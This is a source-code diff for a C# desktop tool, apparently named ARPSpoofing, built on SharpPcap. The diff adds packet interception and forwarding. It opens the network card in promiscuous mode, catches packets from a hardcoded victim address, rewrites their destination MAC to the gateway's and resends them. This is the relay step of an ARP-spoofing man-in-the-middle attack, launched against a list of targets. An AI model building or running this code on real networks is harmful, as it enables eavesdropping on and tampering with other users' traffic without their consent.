@@ -200,7 +200,7 @@ namespace ARPSpoofing
             {
                 LibPcapLiveDevice = null;
                 MessageBox.Show("网卡数量不足", "错误", MessageBoxButton.OK, MessageBoxImage.Error);
-                return;
+                return; 
             }
 
             LibPcapLiveDevice = LibPcapLiveDevices.FirstOrDefault();
@@ -250,29 +250,35 @@ namespace ARPSpoofing
             StartIpAddress = GatewayIp.ToString();
             EndIpAddress = GatewayIp.ToString();
             GatewayMac = Resolve(GatewayIp);
-
-            if (GatewayMac != null)
-            {
-                LibPcapLiveDevice.OnPacketArrival +=
-                            new PacketArrivalEventHandler(OnPacketArrival);
-            }
         }
 
         private void OnPacketArrival(object sender, PacketCapture e)
         {
-            var packet = TcpPacket.ParsePacket(e.Device.LinkType, e.Data.ToArray());
-            if (packet != null) 
+            var device = sender as LibPcapLiveDevice;
+            var packet = Packet.ParsePacket(e.Device.LinkType, e.Data.ToArray());
+            if (packet != null)
             {
-                TcpPacket tcpPacket = packet.Extract<TcpPacket>();
-                if (tcpPacket != null) 
+                if (packet is EthernetPacket ethernetPacket)
                 {
-                    var ipPacket = (IPPacket)tcpPacket.ParentPacket;
-                    if (ipPacket != null) 
-                    {
-                        if (ipPacket.SourceAddress.ToString() == "192.168.21.178") 
-                        {
+                    IPPacket ipPacket = ethernetPacket.Extract<IPPacket>();
+                    if (ipPacket == null) return;
 
-                        }
+                    if (ipPacket.SourceAddress.ToString() == "192.168.1.2")
+                    {
+                        //var tempTcpPacket = new TcpPacket(outerTcpPacket.SourcePort, outerTcpPacket.DestinationPort);
+                        //tempTcpPacket.PayloadData = outerTcpPacket.PayloadData;
+
+                        //IPv4Packet tempIpV4Packet = new IPv4Packet(outerIpPacket.SourceAddress, outerIpPacket.DestinationAddress);
+                        ////ipPacket.Version = 4;
+                        //tempIpV4Packet.HeaderLength = (byte)(IPv4Fields.HeaderLength + (tempTcpPacket.Options.Count() * 1));
+                        ////ipPacket.typ = 0;
+                        //tempIpV4Packet.TotalLength = (ushort)(tempIpV4Packet.HeaderLength + tempTcpPacket.Bytes.Length);
+                        //tempIpV4Packet.TimeToLive = 128;
+                        //tempIpV4Packet.Protocol = PacketDotNet.ProtocolType.Tcp;
+                        //tempIpV4Packet.PayloadPacket = tempTcpPacket;
+
+                        ethernetPacket.DestinationHardwareAddress = GatewayMac;
+                        device.SendPacket(ethernetPacket);
                     }
                 }
             }
@@ -317,15 +323,6 @@ namespace ARPSpoofing
                     {
                         Application.Current.Dispatcher.Invoke(() => IsScanning = false);
                     }
-
-                    ////如果attacktasks已完成，则IsScanning = false;
-                    //if ((_attackTasks == null || _attackTasks.Count <= 0 || _attackTasks.All(x => x.IsCanceled)
-                    //        || _attackTasks.All(x => x.IsCompleted)) && IsAttacking)
-                    //{
-                    //    _attackTasks?.Clear();
-                    //    _cancellationTokenSource1 = new CancellationTokenSource();
-                    //    Application.Current.Dispatcher.Invoke(() => IsAttacking = false);
-                    //}
 
                     await Task.Delay(500);
                 }
@@ -487,9 +484,12 @@ namespace ARPSpoofing
             IsAttacking = true;
             if (!LibPcapLiveDevice.Opened)
             {
-                
+                LibPcapLiveDevice.OnPacketArrival -= new PacketArrivalEventHandler(OnPacketArrival);
+                LibPcapLiveDevice.OnPacketArrival += new PacketArrivalEventHandler(OnPacketArrival);
                 LibPcapLiveDevice.Open(DeviceModes.Promiscuous, 20);
-                LibPcapLiveDevice.Filter = "ether dst " + LocalMac.ToString();
+                //LibPcapLiveDevice.Filter = "ether dst " + LocalMac.ToString();
+                //LibPcapLiveDevice.StartCapture();
+            
             }
             foreach (var compute in target)
             {
